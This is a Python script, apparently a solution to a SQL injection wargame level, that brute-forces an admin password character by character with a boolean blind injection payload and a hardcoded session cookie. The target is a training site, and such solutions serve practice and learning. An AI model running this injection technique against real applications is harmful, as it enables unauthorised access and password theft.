# python 3.6.5
import urllib.request
import urllib.parse
MyHeader = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
'Accept-Encoding': 'none',
'Accept-Language': 'en-US,en;q=0.8',
'Connection': 'keep-alive'}
#MyCookies = {'PHPSESSID': '68jotprn1p8enuiqjd12ahvgs7','_cfduid':'db874ed463a1dda475cbf0410b0e3f66c1494392708'}
length=8
pw=""
arr="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
for i in range(1,9):
	for j in range(0,62):
		url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=*'%20||%20id='admin'%20and%20substr(pw,{0},1)='{ascii}'%23".format(i,ascii=arr[j])
		print("1")
		print(url)
		r = urllib.request.Request(url)
		print("2")
		r.add_header("Cookie","PHPSESSID=9bcrphabh03redvupi1pci5ml2")
		print("3")
		data = urllib.request.urlopen(r)
		print("4")
		asdf = data.read().decode('utf-8')
		# print(asdf)
		if asdf.find("Hello admin") != -1 :
			pw = pw + arr[j]
			print("This is    "+arr[j])
			break
print(pw)